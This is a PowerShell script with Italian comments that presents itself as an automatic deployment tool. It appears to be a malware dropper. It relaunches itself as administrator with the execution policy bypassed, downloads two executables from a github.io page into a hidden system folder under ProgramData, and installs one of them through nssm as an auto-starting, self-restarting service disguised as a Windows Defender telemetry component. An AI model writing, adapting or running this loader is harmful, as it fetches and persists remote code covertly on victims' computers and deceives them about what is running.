# ===================================================================
# SCRIPT DI DEPLOYMENT UNICO E AUTOMATICO
# Gestisce l'elevazione dei privilegi, il download e l'installazione.
# ===================================================================

# --- Configurazione Globale ---
$ErrorActionPreference = 'Stop' # Interrompe lo script in caso di errore

# --- 1. CONTROLLO ED ELEVAZIONE DEI PRIVILEGI ---

# Ottiene l'identità dell'utente corrente
$currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())

# Controlla se lo script è in esecuzione come Amministratore
if (-not $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    # Se non è Amministratore, si riavvia con privilegi elevati
    Write-Warning "Privilegi di amministratore richiesti. Riavvio dello script in corso..."
    
    # Costruisce gli argomenti per il nuovo processo
    $arguments = "-ExecutionPolicy Bypass -File `"$PSCommandPath`""
    
    # Avvia un nuovo processo PowerShell con il verbo "RunAs" per richiedere l'elevazione
    Start-Process PowerShell -ArgumentList $arguments -Verb RunAs
    
    # Esce dallo script corrente (non elevato)
    exit
}

# --- DA QUI IN POI, LO SCRIPT HA I PRIVILEGI DI AMMINISTRATORE ---

Write-Host "Script in esecuzione con privilegi di amministratore." -ForegroundColor Green

# --- 2. LOGICA PRINCIPALE (DOWNLOAD E INSTALLAZIONE) ---

try {
    # --- Variabili di configurazione ---
    $baseUrl = "https://elguapomalo.github.io/crazyngl/"
    $filesToDownload = @("syscheck.exe", "nssm.exe")
    $destDir = "$env:ProgramData\Microsoft\MediaCache" # Cartella di destinazione discreta
    $serviceName = "WinDefenderCacheSvc"
    $displayDesc = "Gestore cache per la telemetria di Windows Defender"

    # --- A. Preparazione e Download (logica del loader) ---
    Write-Host "Preparo la directory di destinazione: $destDir"
    if (-not (Test-Path $destDir)) {
        New-Item -Path $destDir -ItemType Directory -Force | Out-Null
    }
    (Get-Item $destDir).Attributes = 'Hidden', 'System'

    Write-Host "Download dei componenti necessari..."
    foreach ($file in $filesToDownload) {
        $destPath = Join-Path $destDir $file
        Write-Host "  -> Scarico $file..."
        Invoke-WebRequest -Uri ($baseUrl + $file) -OutFile $destPath -UseBasicParsing
    }
    Write-Host "Download completato." -ForegroundColor Green

    # --- B. Installazione del Servizio (logica dell'installer) ---
    $nssmPath = Join-Path $destDir "nssm.exe"
    $exeToInstall = Join-Path $destDir "syscheck.exe"

    # Pulisce eventuali installazioni precedenti
    if (Get-Service $serviceName -ErrorAction SilentlyContinue) {
        Write-Host "Rilevato servizio esistente. Tentativo di arresto e rimozione..." -ForegroundColor Yellow
        $service = Get-Service $serviceName
        if ($service.Status -ne 'Stopped') {
            Stop-Service -Name $serviceName -Force -ErrorAction SilentlyContinue
            $service.WaitForStatus('Stopped', [System.TimeSpan]::FromSeconds(30))
        }
        & $nssmPath remove $serviceName confirm | Out-Null
        Write-Host "Attesa di 5 secondi per la pulizia del sistema..."
        Start-Sleep -Seconds 5
    }

    # Installa e configura il nuovo servizio
    Write-Host "Installazione del servizio '$serviceName'..."
    & $nssmPath install $serviceName $exeToInstall
    & $nssmPath set $serviceName Description $displayDesc
    & $nssmPath set $serviceName DisplayName $serviceName
    & $nssmPath set $serviceName Start SERVICE_AUTO_START

    # Configura il ripristino automatico
    sc.exe failure $serviceName reset= 86400 actions= restart/60000/restart/60000/restart/60000

    # Avvia il servizio
    Start-Service -Name $serviceName

    Write-Host "[SISTEMA AGGIORNATO] Il servizio $serviceName è ora attivo, m'Lord." -ForegroundColor Cyan

} catch {
    Write-Host "ERRORE: Si è verificato un problema durante l'esecuzione." -ForegroundColor Red
    Write-Host "Dettagli: $($_.Exception.Message)" -ForegroundColor Red
}

# Pausa finale se eseguito in una nuova finestra, per leggere l'output
if ($Host.Name -eq "ConsoleHost" -and $MyInvocation.Line -eq "") {
    Write-Host "Operazione completata. Premi Invio per chiudere."
    Read-Host
}